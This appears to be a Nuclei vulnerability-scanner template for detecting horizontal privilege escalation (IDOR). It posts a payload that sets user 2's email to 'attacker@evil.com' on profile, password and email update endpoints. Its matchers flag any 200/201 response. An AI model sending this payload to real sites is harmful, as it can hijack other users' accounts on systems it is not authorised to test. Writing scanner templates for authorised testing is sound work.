id: m7-idor-horizontal-priv
info:
  name: M7 - IDOR Horizontal Privilege Escalation
  author: Sharlix
  severity: high
  description: Detects horizontal privilege escalation via parameter manipulation
  tags: idor,privilege,escalation,m7hunter

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/update-profile"
      - "{{BaseURL}}/api/change-password"
      - "{{BaseURL}}/api/update-email"
      - "{{BaseURL}}/profile/update"

    body: |
      {"user_id": 2, "email": "attacker@evil.com"}

    headers:
      Content-Type: application/json

    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: dsl
        dsl:
          - "!contains(body, 'unauthorized') && !contains(body, 'forbidden')"
